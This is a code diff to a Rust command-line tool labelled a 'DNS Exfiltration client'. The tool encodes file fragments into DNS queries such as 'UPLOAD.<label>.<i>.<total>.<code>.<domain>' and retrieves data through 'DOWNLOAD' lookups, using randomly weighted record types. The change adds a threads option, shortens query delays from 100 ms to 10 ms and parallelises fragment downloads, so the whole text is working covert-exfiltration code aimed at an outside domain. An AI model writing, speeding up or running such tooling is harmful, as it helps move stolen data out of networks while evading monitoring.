@@ -17,6 +17,10 @@ const MAX_ATTEMPTS: usize = 10;
 struct Args {
     #[command(subcommand)]
     command: Commands,
+
+    /// Number of threads to use
+    #[arg(short, long, default_value_t = 4)]
+    threads: usize,
 }
 
 #[derive(Subcommand, Debug)]
@@ -51,7 +55,7 @@ async fn main() {
     let args = Args::parse();
     let resolver = get_resolver();
 
-    info!("Starting DNS Exfiltration client");
+    info!("Starting DNS Exfiltration client with {} threads", args.threads);
 
     match args.command {
         Commands::Send { code, filename, domain } => {
@@ -70,7 +74,7 @@ async fn main() {
                 async move {
                     let mut attempts = 0;
                     loop {
-                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+                    tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
                     let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, total_labels, code, domain);
             
                     match resolver.lookup(&query, get_random_record_type()).await {
@@ -131,47 +135,45 @@ async fn main() {
             info!("Total fragments to download: {}", total_fragments);
 
             let start_time = Instant::now();
-            let mut received_data: Vec<Option<String>> = vec![None; total_fragments];
-            for (seq, data) in received_data.iter_mut().enumerate().take(total_fragments) {
-                let mut attempts = 0;
-                while attempts < MAX_ATTEMPTS {
-                    let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
-                    tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
+            let futures: Vec<_> = (0..total_fragments).map(|seq| {
+                let resolver = resolver.clone();
+                let code = code.clone();
+                let domain = domain.clone();
+                async move {
+                    let mut attempts = 0;
+                    let mut data = None;
+                    while attempts < MAX_ATTEMPTS {
+                        let query = format!("DOWNLOAD.{}.{}.{}", code, seq, domain);
+                        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
 
-                    match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
-                        Ok(lookup) => {
-                            let records = lookup.iter().collect::<Vec<_>>();
-                            let record_data = records[0].to_string();
-                            *data = Some(record_data);
-                            break;
-                        }
-                        Err(_) => {
-                            attempts += 1;
+                        match resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::ANY).await {
+                            Ok(lookup) => {
+                                let records = lookup.iter().collect::<Vec<_>>();
+                                let record_data = records[0].to_string();
+                                data = Some(record_data);
+                                break;
+                            }
+                            Err(_) => {
+                                attempts += 1;
+                            }
                         }
                     }
-                }
 
-                if attempts >= MAX_ATTEMPTS {
-                    error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
-                    error!("Aborting...");
-                    std::process::exit(1);
-                }
+                    if attempts >= MAX_ATTEMPTS {
+                        error!("Failed to retrieve fragment after {} attempts: {}", MAX_ATTEMPTS, seq);
+                        error!("Aborting...");
+                        std::process::exit(1);
+                    }
 
-                let progress = (seq + 1) as f32 / total_fragments as f32 * 100.0;
-                let elapsed = start_time.elapsed().as_secs_f32();
-                let estimated_total = elapsed / ((seq + 1) as f32 / total_fragments as f32);
-                let remaining = estimated_total - elapsed;
-                info!(
-                    "Progress: {:.1}% - Elapsed: {:.1}s - Remaining: {:.1}s",
-                    progress, elapsed, remaining
-                );
-            }
+                    data
+                }
+            }).collect();
+
+            let received_data: Vec<_> = join_all(futures).await.into_iter().flatten().collect();
 
             let elapsed = start_time.elapsed().as_secs_f32();
             let byte_rate = (total_fragments as f32 * 32.0) / elapsed; // Assuming each fragment is 32 bytes
-            let decoded_data = decode_base32(
-                received_data.into_iter().flatten().collect(),
-            );
+            let decoded_data = decode_base32(received_data);
             let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
             fs::write(&filename, flattened_data).expect("Failed to write data to file");
             info!("Data successfully written to file: {}", filename);
@@ -192,5 +194,4 @@ fn get_random_record_type() -> hickory_resolver::proto::rr::RecordType {
     let dist = WeightedIndex::new(&weights).unwrap();
     let mut rng = thread_rng();
     record_types[dist.sample(&mut rng)]
-    
 }
